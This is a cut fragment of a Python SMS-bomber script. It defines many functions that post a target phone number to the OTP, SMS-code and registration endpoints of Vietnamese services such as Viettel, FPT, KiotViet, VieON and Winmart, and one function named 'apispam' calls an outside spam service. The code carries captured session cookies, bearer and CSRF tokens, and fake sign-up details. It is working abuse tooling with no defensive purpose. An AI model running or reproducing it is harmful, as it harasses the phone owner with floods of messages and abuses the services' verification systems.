ubo_token=Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjM0MjM5OTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.QyAD_zWYVih-q10DAPQW_pCAvh7FDic4rpxgIubO3eqq9rvnzLmFUU3vm8NCRBB-ot4QO8EpyPu8VZ1RDALB7xOJqaUOzJ_sEWwNMZXr9Zl1DB8MsowoneZKq0IeQmF7AsWZ2nOCXQThVXCjDpdX6z0sfDUVbSBCvkoXKElFawG86Eo9VDFqGmR9W6abT8Y04wkeKSIAPc0N9dGUFTwmbjH3ihNWxsTwo2x_tavHlh8uvXR4Cl_qyewiUFaPkvn7joDEAQu04ub530yoge-zzlW2Dqjw0cfT1zH0QPqBS_bhtZQcJ0sxEfVgAHE9w5MIxPA6mSIBn6kGnZpaWa5vlNbxAEcZCAuprIRy9Ap-qIu6tmmlkPMTuOGPAWBaffWtkP28EV4xfNm9CQOTkGTZLKRo3o2YrT1HGm6na08kQZaBmmd5zCdSCDPC4X2xRH8BPpBs08oZfuORCVsWpCcwL_8pvaMbb4wwTEzfFkKAIjzXjFUu4B2Hq4ymNixu-mCcXmW5z5FC-Kzg4b2pUYuf7umoOLAnFVfNK_0j37gSYT0DeLdjWWyS5pZOCom-18XRoOnDhwhA_Dc0Emby-xX-BNiVSXvzderCWsGkffVKSv2NYiAEcVcobY9WvPAwSi-FAfCycO3X3RNb3zVoecfrpu6SCzkbK_atUotFNL_C3uU; _ga_KCGG79N4SY=GS1.1.1691887985.1.1.1691887993.0.0.0; _ga_3PKTQRQF3P=GS1.1.1691887985.1.1.1691888009.36.0.0',
}
  data = '{"phone_number":"sdt","trade_code":"379760000"}'.replace('sdt',sdt)
  response = requests.post('https://ubofood.com/api/v1/account/customers/register', headers=headers, data=data).text
def tamo(sdt):
  data = '{"mobilePhone":{"number":"sdt"}}'.replace("sdt",sdt)
  head = {
    "Host":"api.tamo.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json;charset=UTF-8",
    "origin":"https://www.tamo.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://www.tamo.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts",data=data,headers=head).json()
def thantaioi():
  headers = {
    'Host': 'api.thantaioi.vn',
    'accept-language': 'vi',
    'authorization': 'Bearer ' + tokenthantaioi ,
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'accept': '*/*',
    'origin': 'https://thantaioi.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://thantaioi.vn/user/registration/reg2',
    # 'accept-encoding': 'gzip, deflate, br',
    # 'cookie': '_ym_uid=169110846991669337; _ym_d=1691108469; _fw_crm_v=dbfc3e99-4c79-4c24-8854-63cea51ea448; _gid=GA1.2.551830717.1691894331; _ym_isad=2; _ym_visorc=w; _ga=GA1.2.282932599.1691108469; _ga_LN0QPGLCB5=GS1.2.1691894333.3.1.1691894444.0.0.0; _ga_LBS7YCVKY6=GS1.1.1691894332.3.1.1691894445.55.0.0',
}
  response = requests.get('https://api.thantaioi.vn/api/user/phone-confirmation-code', headers=headers).text
def meta(sdt):
  data = '{"api_args":{"lgUser":"sdt","act":"send","type":"phone"},"api_method":"CheckExist"}'.replace("sdt",sdt)
  head = {
    "Host":"meta.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "origin":"https://meta.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-origin",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://meta.vn/account/register",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.post("https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1",data=data,headers=head).text
def shopiness(sdt):
  cookies = {
    '_gcl_au': '1.1.713290776.1691278322',
    '_gid': 'GA1.2.538313268.1691278323',
    '_gat_UA-78703708-2': '1',
    '_ga': 'GA1.1.1304515259.1691278323',
    '_fbp': 'fb.1.1691278324147.1207721038',
    '_ga_P138SCK22P': 'GS1.1.1691278323.1.1.1691278362.21.0.0',
  }
  headers = {
    'Host': 'shopiness.vn',
    'Connection': 'keep-alive',
    # 'Content-Length': '63',
    'Accept': '*/*',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://shopiness.vn',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://shopiness.vn/khuyen-mai/pizza-hut-mua-1-tang-1-khi-giao-hang-tan-noi.80C793B3FC.html',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': '_gcl_au=1.1.713290776.1691278322; _gid=GA1.2.538313268.1691278323; _gat_UA-78703708-2=1; _ga=GA1.1.1304515259.1691278323; _fbp=fb.1.1691278324147.1207721038; _ga_P138SCK22P=GS1.1.1691278323.1.1.1691278362.21.0.0',
  }
  data = {
    'action': 'verify-registration-info',
    'phoneNumber': f'{sdt}',
    'refCode': '',
  }
  response = requests.post('https://shopiness.vn/ajax/user', cookies=cookies, headers=headers, data=data).json()
def kiot(phone):
    cookies = {
        'AKA_A2': 'A',
        'gkvas-uuid': 'b1b6bfdd-724e-449f-8acc-f3594f1aae3f',
        'gkvas-uuid-d': '1687347271111',
        'kvas-uuid': '1fdbe87b-fe8b-4cd5-b065-0900b3db04b6',
        'kvas-uuid-d': '1687347276471',
        'kv-session': '52268693-9db7-4b7d-ab00-0f5022612bc5',
        'kv-session-d': '1687347276474',
        '_fbp': 'fb.1.1687347277057.810313564',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_563959': '1',
        '_hjSession_563959': 'eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==',
        '_hjAbsoluteSessionInProgress': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'idt42AWvO5FQ_0j25HtJ7BSoA7J',
        '_gid': 'GA1.2.1225607496.1687347277',
        '_hjSessionUser_563959': 'eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==',
        '_ga_6HE3N545ZW': 'GS1.1.1687347278.1.1.1687347282.56.0.0',
        '_ga_N9QLKLC70S': 'GS1.2.1687347283.1.1.1687347283.0.0.0',
        '_fw_crm_v': '4c8714f2-5161-4721-c213-fe417c49ae65',
        'parent': '65',
        '_ga': 'GA1.2.1568204857.1687347277',
    }

    headers = {
        'authority': 'www.kiotviet.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'AKA_A2=A; gkvas-uuid=b1b6bfdd-724e-449f-8acc-f3594f1aae3f; gkvas-uuid-d=1687347271111; kvas-uuid=1fdbe87b-fe8b-4cd5-b065-0900b3db04b6; kvas-uuid-d=1687347276471; kv-session=52268693-9db7-4b7d-ab00-0f5022612bc5; kv-session-d=1687347276474; _fbp=fb.1.1687347277057.810313564; _hjFirstSeen=1; _hjIncludedInSessionSample_563959=1; _hjSession_563959=eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=1; _tt_enable_cookie=1; _ttp=idt42AWvO5FQ_0j25HtJ7BSoA7J; _gid=GA1.2.1225607496.1687347277; _hjSessionUser_563959=eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==; _ga_6HE3N545ZW=GS1.1.1687347278.1.1.1687347282.56.0.0; _ga_N9QLKLC70S=GS1.2.1687347283.1.1.1687347283.0.0.0; _fw_crm_v=4c8714f2-5161-4721-c213-fe417c49ae65; parent=65; _ga=GA1.2.1568204857.1687347277',
        'origin': 'https://www.kiotviet.vn',
        'referer': 'https://www.kiotviet.vn/dang-ky/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': '+84'+phone[1:],
        'code': 'bancainayne',
        'name': 'Cai Nit',
        'email': 'ahihi123982@gmail.com',
        'zone': 'An Giang - Huyện Châu Phú',
        'merchant': 'bancainayne',
        'username': '0972936627',
        'industry': 'Điện thoại & Điện máy',
        'ref_code': '',
        'industry_id': '65',
        'phone_input': "0338607465",
    }

    response = requests.post(
        'https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',
        cookies=cookies,
        headers=headers,
        data=data,
    ).text
def fpt(phone):
	requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
def alfrescos(sdt):
  data = '{"phoneNumber":"sdt","secureHash":"33f65da1c264ef7f519149065a600def","deviceId":"","sendTime":1691068424578,"type":2}'.replace("sdt",sdt)
  head = {
    "Host":"api.alfrescos.com.vn",
    "accept":"application/json, text/plain, */*",
    "brandcode":"ALFRESCOS",
    "devicecode":"web",
    "accept-language":"vi-VN",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "origin":"https://alfrescos.com.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://alfrescos.com.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN",data=data,headers=head).json()
def poyeye(sdt):
  data= '{"phone":"sdt","firstName":"Nguyen","lastName":"Hoang","email":"Khgf123@gmail.com","password":"1262007gdtg"}'
  data = data.replace("sdt",sdt)
  head = {
    "Host":"api.popeyes.vn",
    "accept":"application/json",
    "x-client":"WebApp",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://popeyes.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.popeyes.vn/api/v1/register",data=data, headers=head).json()
def vieon(sdt):
  data = f'phone_number={sdt}&password=1262007Gdtg&given_name=&device_id=688e6ab3da160a362df3805047548504&platform=mobile_web&model=Android%208.1.0&push_token=&device_name=Chrome%2F114&device_type=desktop&isMorePlatform=true&ui=012021'
  head = {
    "Host":"api.vieon.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/x-www-form-urlencoded",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vieon.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021",data=data,headers=head).json()
def tv360(sdt):
  head = {
    "Host":"m.tv360.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
  }
  data = '{"msisdn":"sdt"}'
  data = data.replace("sdt",sdt)
  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
  '''if not rq["errorCode"] == 200:
    print("Lỗi 360tv")'''
def winmart(sdt):
  head = {
    "Host":"api-crownx.winmart.vn",
    "accept":"application/json",
    "authorization":"Bearer undefined",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://winmart.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={sdt}",headers=head).json()
def fptplay(phone):
    Headers = {"Host": "api.fptplay.net","content-length": "89","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json; charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://fptplay.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptplay.vn/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phone": phone,"country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"})
    response = requests.post("https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st\u003dEim9hpobCZPoIoVVokkIDA\u0026e\u003d1681802671\u0026device\u003dChrome(version%253A112.0.0.0)\u0026drm\u003d1", data=Datason, headers=Headers).json()
def funring(sdt):
  data ='{"username": "sdt"}'.replace("sdt",sdt)
  head = {
    "Host":"funring.vn",
    "Connection":"keep-alive",
    "Accept":"*/*",
    "User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "Content-Type":"application/json",
    "X-Requested-With":"mark.via.gp",
    "Accept-Encoding":"gzip, deflate",
    "Accept-Language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
  }
  rq = requests.post("http://funring.vn/api/v1.0.1/jersey/user/getotp",data=data,headers=head).json()
def apispam(phone):
  cookies = {
    '_ga': 'GA1.1.1928856259.1691039310',
    'serverChoice': 'Server-IPv1',
    '_ga_Y4RF4MF664': 'GS1.1.1691039309.1.1.1691039359.0.0.0',
  }
  headers = {
    'authority': 'crowstore.online',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_ga=GA1.1.1928856259.1691039310; serverChoice=Server-IPv1; _ga_Y4RF4MF664=GS1.1.1691039309.1.1.1691039359.0.0.0',
    'origin': 'https://crowstore.online',
    'referer': 'https://crowstore.online/sms.php',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
  }
  data = {
    'sodienthoai': phone,
    'ten_server': 'Server-IPv1',
    'key': 'freekey307',
  }
  response = requests.post('https://crowstore.online/sms.php', cookies=cookies, headers=headers, data=data).text
def vietid(phone):
    csrfget = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F").text
    csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
    Headers = {"Host": "oauth.vietid.net","content-length": "41","cache-control": "max-age\u003d0","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","origin": "https://oauth.vietid.net","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"}
    Payload = {"csrf-token": csrf,"account": phone}
    response = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", data=Payload, headers=Headers).text
def dkvt(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data).text
def viettel(phone):
    cookies = {
        'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
        '_gcl_au': '1.1.307401310.1685096321',
        '_gid': 'GA1.2.1786782073.1685096321',
        '_fbp': 'fb.1.1685096322884.1341401421',
        '__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        '_ga_VH8261689Q': 'GS1.1.1685096321.1.1.1685096380.1.0.0',
        '_ga': 'GA1.2.1385846845.1685096321',
        '_gat_UA-58224545-1': '1',
        'XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv; _gcl_au=1.1.307401310.1685096321; _gid=GA1.2.1786782073.1685096321; _fbp=fb.1.1685096322884.1341401421; __zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1; redirectLogin=https://vietteltelecom.vn/dang-ky; _ga_VH8261689Q=GS1.1.1685096321.1.1.1685096380.1.0.0; _ga=GA1.2.1385846845.1685096321; _gat_UA-58224545-1=1; XSRF-TOKEN=eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data).text
def appota(sdt):
  headers = {
    'Host': 'vi.appota.com',
    # 'content-length': '23',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://vi.appota.com',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://vi.appota.com/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
